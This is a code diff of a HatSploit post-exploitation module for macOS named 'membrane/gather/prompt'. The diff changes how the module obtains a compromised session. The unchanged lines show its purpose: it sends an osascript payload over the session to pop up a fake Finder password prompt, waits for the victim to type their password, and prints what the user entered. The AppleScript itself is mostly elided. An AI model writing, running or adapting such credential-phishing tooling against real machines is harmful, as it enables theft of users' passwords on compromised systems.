@@ -26,15 +26,13 @@
 
 from core.badges import badges
 from core.parser import parser
-
-from data.modules.exploit.macos.stager.membrane_reverse_tcp.core.session import session
+from core.sessions import sessions
 
 class HatSploitModule:
     def __init__(self):
         self.badges = badges()
         self.parser = parser()
-        
-        self.session = session()
+        self.sessions = sessions()
 
         self.details = {
             'Name': "post/macos/membrane/gather/prompt",
@@ -60,8 +58,8 @@ class HatSploitModule:
         }
 
     def run(self):
-        exists, controller = self.session.get_session(self.parser.parse_options(self.options))
-        if exists:
+        session = self.sessions.get_session("macos/membrane", self.parser.parse_options(self.options))
+        if session:
             self.badges.output_process("Waiting for prompt window to appear...")
             payload = """
             tell application "Finder"
@@ -82,8 +80,8 @@ class HatSploitModule:
             end tell
             """
             self.badges.output_process("Waiting for user to type password...")
-            status, output = controller.send_command("osascript", payload)
-            if status == "error":
+            status, output = session.send_command("osascript", payload)
+            if not status:
                 self.badges.output_error("Failed to prompt user to type password!")
             else:
                 self.badges.output_information("User Entered: " + output)
